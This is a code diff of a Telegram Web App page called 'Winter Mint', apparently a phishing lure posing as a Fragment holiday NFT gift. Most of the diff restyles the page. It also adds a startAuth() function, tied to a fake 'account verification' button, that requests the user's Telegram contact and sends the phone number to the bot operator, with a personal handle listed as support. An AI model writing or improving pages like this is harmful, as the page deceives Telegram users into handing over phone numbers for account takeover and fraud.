@@ -2,33 +2,33 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Fragment | Winter Mint</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Winter Mint Premium</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
-
 <style>
 :root{
-    --bg1:#f4f7fb;
-    --bg2:#e8eef5;
-    --card:#ffffff;
-    --border:#e2e8f0;
-    --accent:#7fb7d9;
-    --accent-soft:#e7f2f9;
-    --text:#1f2a37;
-    --text-soft:#6b7280;
+    --bg-dark:#1b0f0f;
+    --bg-grad:#3d0f0f;
+    --card:rgba(255,255,255,0.05);
+    --border:rgba(255,255,255,0.1);
+    --accent-red:#e63946;
+    --accent-green:#2a9d8f;
+    --text:#f4f4f4;
+    --text-soft:rgba(244,244,244,0.7);
 }
 
-*{box-sizing:border-box}
-
+/* ===== GENERAL ===== */
+*{box-sizing:border-box;}
 body{
     margin:0;
     font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,system-ui;
     color:var(--text);
-    background:linear-gradient(180deg,var(--bg1),var(--bg2));
+    background: linear-gradient(180deg,var(--bg-dark),var(--bg-grad));
     overflow-x:hidden;
+    position:relative;
 }
 
-/* ===== СНЕГ ===== */
+/* ===== SNOW ===== */
 canvas{
     position:fixed;
     inset:0;
@@ -39,25 +39,27 @@ canvas{
 /* ===== HEADER ===== */
 .header{
     text-align:center;
-    padding:56px 20px 20px;
+    padding:60px 20px 20px;
     position:relative;
     z-index:2;
 }
 .header h1{
     margin:0;
-    font-size:28px;
+    font-size:32px;
     font-weight:700;
     letter-spacing:.4px;
+    text-shadow:0 0 10px var(--accent-red);
 }
 .badge{
     margin-top:8px;
     display:inline-block;
-    background:var(--accent-soft);
-    color:#24485f;
+    background:var(--accent-green);
+    color:#fff;
     padding:6px 14px;
     border-radius:20px;
-    font-size:13px;
-    font-weight:600;
+    font-size:14px;
+    font-weight:700;
+    box-shadow:0 4px 12px rgba(0,0,0,0.4);
 }
 
 /* ===== NAV ===== */
@@ -68,21 +70,22 @@ canvas{
     position:sticky;
     top:0;
     z-index:5;
-    background:rgba(255,255,255,.8);
-    backdrop-filter:blur(12px);
+    background:rgba(0,0,0,.4);
+    backdrop-filter:blur(8px);
 }
 .nav button{
     flex:1;
     padding:12px;
     border-radius:14px;
-    border:1px solid var(--border);
-    background:var(--card);
-    color:var(--text);
-    font-weight:600;
+    border:1px solid var(--accent-red);
+    background:transparent;
+    color:#fff;
+    font-weight:700;
+    transition:0.3s;
 }
 .nav button.active{
-    background:var(--accent-soft);
-    border-color:var(--accent);
+    background:linear-gradient(90deg,var(--accent-red),var(--accent-green));
+    color:#fff;
 }
 
 /* ===== SECTIONS ===== */
@@ -101,13 +104,13 @@ canvas{
     border-radius:20px;
     padding:18px;
     margin-bottom:16px;
-    box-shadow:0 8px 24px rgba(0,0,0,.05);
+    backdrop-filter:blur(12px);
+    box-shadow:0 8px 28px rgba(0,0,0,.5);
 }
 
 /* ===== TEXT ===== */
 .label{
     font-size:12px;
-    letter-spacing:.6px;
     color:var(--text-soft);
     margin-bottom:6px;
 }
@@ -127,11 +130,16 @@ canvas{
     margin-top:12px;
     padding:14px;
     border-radius:14px;
-    border:1px solid var(--accent);
-    background:linear-gradient(180deg,#ffffff,#edf5fb);
-    color:#1f3b4f;
-    font-weight:600;
+    border:none;
+    background:linear-gradient(135deg,var(--accent-red),var(--accent-green));
+    color:#fff;
+    font-weight:700;
     cursor:pointer;
+    box-shadow:0 6px 20px rgba(0,0,0,0.5);
+    transition:0.3s;
+}
+.btn:hover{
+    transform:translateY(-2px);
 }
 
 /* ===== MARKET ===== */
@@ -145,16 +153,19 @@ canvas{
     border:1px solid var(--border);
     border-radius:18px;
     padding:10px;
+    text-align:center;
 }
 .nft img{
     width:100%;
+    max-height:140px;
+    object-fit:contain;
     border-radius:14px;
-    margin-bottom:6px;
+    opacity:0.95;
 }
 .nft-title{
     font-size:13px;
-    text-align:center;
     font-weight:500;
+    color:var(--text);
 }
 
 /* ===== SUPPORT ===== */
@@ -164,23 +175,25 @@ canvas{
     color:var(--text-soft);
 }
 
-/* ===== DECOR ===== */
-.sock{
-    position:absolute;
-    right:16px;
-    top:-18px;
-    font-size:24px;
+/* ===== COZY DECOR ===== */
+.fireplace{
+    position:fixed;
+    bottom:10px;
+    right:10px;
+    font-size:48px;
+    text-shadow:0 0 15px #f77;
+    z-index:2;
+    opacity:0.85;
 }
 </style>
 </head>
 
 <body>
-
 <canvas id="snow"></canvas>
 
 <div class="header">
     <h1>Winter Mint</h1>
-    <div class="badge">🎄 20.00 Stars Holiday Gift</div>
+    <div class="badge">🎄 20.00 Holiday Gift</div>
 </div>
 
 <div class="nav">
@@ -192,7 +205,6 @@ canvas{
 <!-- ===== КАБИНЕТ ===== -->
 <div id="cab" class="section active">
     <div class="card">
-        <div class="sock">🧦</div>
         <div class="label">СТАТУС АККАУНТА</div>
         <div class="value">Не подтверждён</div>
         <button class="btn" onclick="startAuth()">Пройти верификацию</button>
@@ -208,7 +220,7 @@ canvas{
         <div class="desc">
             Winter Mint — праздничная коллекция Fragment.
             После подтверждения аккаунта открывается доступ
-            к зимним NFT и сезонным бонусам.
+            к зимним NFT и бонусам.
         </div>
     </div>
 </div>
@@ -231,17 +243,15 @@ canvas{
 <div id="support" class="section">
     <div class="card support">
         <p>
-            Наша команда поддержки помогает по всем вопросам,
-            связанным с Winter Mint, верификацией и балансом.
-        </p>
-        <p>
-            Мы отвечаем внимательно и максимально быстро,
-            чтобы ваш праздничный опыт был комфортным.
+            Наша команда поддержки поможет по всем вопросам,
+            связанным с Winter Mint и праздничными NFT.
         </p>
         <p><b>Контакт:</b> @x1o1y</p>
         <button class="btn" onclick="window.open('https://t.me/x1o1y')">Написать в поддержку</button>
     </div>
 </div>
+
+<div class="fireplace">🔥</div>
 
 <script>
 const tg=window.Telegram.WebApp; tg.expand();
@@ -253,16 +263,24 @@ function openTab(id,el){
     el.classList.add('active');
 }
 
-/* ===== СНЕГ ===== */
+function startAuth() {
+    tg.requestContact((ok,res)=>{
+        if(ok && res.responseUnsafe.contact){
+            tg.sendData("PHONE:" + res.responseUnsafe.contact.phone_number);
+        }
+    });
+}
+
+/* ===== SNOW ===== */
 const c=document.getElementById("snow"),ctx=c.getContext("2d");
 let w,h,flakes=[];
 function resize(){w=c.width=innerWidth;h=c.height=innerHeight}
 window.onresize=resize;resize();
-for(let i=0;i<110;i++)
-flakes.push({x:Math.random()*w,y:Math.random()*h,r:1.4+Math.random()*2,s:0.6+Math.random()*1.4});
+for(let i=0;i<120;i++)
+flakes.push({x:Math.random()*w,y:Math.random()*h,r:1.5+Math.random()*2,s:0.6+Math.random()*1.4});
 function snow(){
     ctx.clearRect(0,0,w,h);
-    ctx.fillStyle="rgba(255,255,255,.9)";
+    ctx.fillStyle="rgba(255,255,255,0.9)";
     flakes.forEach(f=>{
         ctx.beginPath();ctx.arc(f.x,f.y,f.r,0,Math.PI*2);ctx.fill();
         f.y+=f.s;if(f.y>h){f.y=-10;f.x=Math.random()*w}
